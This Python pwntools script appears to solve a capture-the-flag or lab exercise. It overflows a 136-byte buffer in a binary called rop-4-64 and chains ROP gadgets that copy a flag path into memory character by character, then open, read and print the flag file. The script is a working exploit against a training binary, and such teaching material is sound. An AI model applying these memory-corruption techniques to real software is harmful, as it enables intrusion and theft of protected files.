from pwn import *
import os

DEBUG = False
file = "./rop-4-64"
env = {"PATH":"$PATH:."}

elf = ELF(file)
max_len = 136

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *0x0000000000400c25 
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE


write = p64(elf.symbols["write"])
read = p64(elf.symbols["read"])
opn = p64(elf.symbols["open"])
strcpy = p64(elf.symbols["strcpy"])

writeable = 0x6ba000 + 0x500

pop_rdi = p64(0x0000000000400686)
pop_rsi = p64(0x0000000000410713)
pop_rdx = p64(0x0000000000447465)

target_str = b"/home/labs/unit5/rop-4-64/flag\0" 

payload = b"A" * max_len
chars = b"the quick brown fox jumps over the lazy dog!\0"
chars_addr = next(elf.search(chars))
nums = b"1234567890-"
nums_addr = next(elf.search(nums))

slash_addr = p64(0x49786c)
nums_addr = next(elf.search(nums))

for off, c in enumerate(target_str):
    if c in nums:
        src = p64(nums_addr + nums.find(c))
    elif c in chars:
        src = p64(chars_addr + chars.find(c))
    else:
        src = slash_addr

    payload += flat (
        pop_rdi,
        p64(writeable + off),
        pop_rsi,
        src,
        strcpy,
    )


payload += flat (
    pop_rdi,
    p64(writeable),

    pop_rsi,
    p64(0),

    pop_rdx,
    p64(0),

    opn,

    pop_rdi,
    p64(0x3),

    pop_rsi,
    p64(writeable),

    pop_rdx,
    p64(100),

    read,

    pop_rdi,
    p64(0x1),

    pop_rsi,
    p64(writeable),

    pop_rdx,
    p64(100),

    write,
)

io.send(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
